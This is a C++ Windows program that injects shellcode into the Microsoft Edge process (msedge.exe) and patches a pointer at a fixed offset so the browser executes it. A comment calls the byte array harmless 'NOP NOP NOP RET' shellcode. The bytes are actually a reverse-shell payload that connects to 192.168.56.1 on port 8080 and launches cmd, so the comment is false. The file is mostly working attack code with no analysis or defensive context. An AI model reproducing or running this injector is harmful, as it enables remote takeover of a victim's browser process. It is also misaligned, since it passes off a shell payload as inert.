#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <psapi.h>
#include <cstdint>     //  Needed for uint64_t
#include <cstring>     // Needed for _stricmp

#define TARGET_PROCESS_NAME "msedge.exe"
#define DQ_OFFSET 0x30E998

// Example shellcode (NOP NOP NOP RET)
std::vector<uint8_t> shellcode = {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,
0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,
0xe5,0x49,0xbc,0x02,0x00,0x1f,0x90,0xc0,0xa8,0x38,0x01,0x41,
0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,
0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,
0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,
0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,
0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,
0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,
0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,
0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,
0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,
0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,
0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,
0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,
0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,
0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,
0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,
0x41,0x89,0xda,0xff,0xd5
};

// üîç Find PID of the target process
DWORD FindProcessId(const char* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &entry)) {
        do {
            if (!_stricmp(entry.szExeFile, processName)) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

//  Get base address of target module
uintptr_t GetModuleBaseAddress(DWORD pid, const char* moduleName) {
    uintptr_t baseAddress = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    MODULEENTRY32 moduleEntry;
    moduleEntry.dwSize = sizeof(MODULEENTRY32);

    if (Module32First(snapshot, &moduleEntry)) {
        do {
            if (!_stricmp(moduleEntry.szModule, moduleName)) {
                baseAddress = (uintptr_t)moduleEntry.modBaseAddr;
                break;
            }
        } while (Module32Next(snapshot, &moduleEntry));
    }

    CloseHandle(snapshot);
    return baseAddress;
}

int main() {
    uintptr_t Jmpoffset = 0x1A8AF7;
    // Step 1: Get PID
    DWORD pid = FindProcessId(TARGET_PROCESS_NAME);
    if (!pid) {
        std::cerr << " msedge.exe not found.\n";
        return 1;
    }
    std::cout << " PID of msedge.exe: " << pid << "\n";

    // Step 2: Get base address of msedge.exe
    uintptr_t baseAddress = GetModuleBaseAddress(pid, TARGET_PROCESS_NAME);
    if (!baseAddress) {
        std::cerr << "Failed to get base address.\n";
        return 2;
    }
    std::cout << " Base address of msedge.exe: 0x" << std::hex << baseAddress << "\n";
    uintptr_t JmpAddress = baseAddress + Jmpoffset;
    std::cout << "Jmp Address   : 0x" << std::hex << JmpAddress << std::endl;

    // Step 3: Calculate target dq address
    LPVOID patchAddr = (LPVOID)(baseAddress + DQ_OFFSET);
    std::cout << " DQ address to patch: 0x" << std::hex << (uintptr_t)patchAddr << "\n";

    // Step 4: Open process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "Failed to open process.\n";
        return 3;
    }

    // Step 5:  Allocate memory for shellcode
    LPVOID remoteShellcode = VirtualAllocEx(hProc, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        std::cerr << " Failed to allocate memory.\n";
        CloseHandle(hProc);
        return 4;
    }
    std::cout << " Allocated shellcode memory at: 0x" << std::hex << (uintptr_t)remoteShellcode << "\n";

    // Step 6: üöÄ Write shellcode
    if (!WriteProcessMemory(hProc, remoteShellcode, shellcode.data(), shellcode.size(), nullptr)) {
        std::cerr << " Failed to write shellcode.\n";
        VirtualFreeEx(hProc, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 5;
    }

    // Step 7: Change memory protection of dq
    DWORD oldProtect;
    if (!VirtualProtectEx(hProc, patchAddr, sizeof(uint64_t), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << " Failed to change memory protection.\n";
        CloseHandle(hProc);
        return 6;
    }

    // Step 8: Patch dq with shellcode address
    uint64_t shellcodeAddr = (uint64_t)remoteShellcode;
    if (!WriteProcessMemory(hProc, patchAddr, &shellcodeAddr, sizeof(shellcodeAddr), nullptr)) {
        std::cerr << " Failed to patch dq.\n";
        VirtualProtectEx(hProc, patchAddr, sizeof(shellcodeAddr), oldProtect, &oldProtect);
        CloseHandle(hProc);
        return 7;
    }

    // Step 9:  Restore protection
    VirtualProtectEx(hProc, patchAddr, sizeof(shellcodeAddr), oldProtect, &oldProtect);

    std::cout << "Successfully patched dq to point to shellcode.\n";

    CloseHandle(hProc);
    return 0;
}
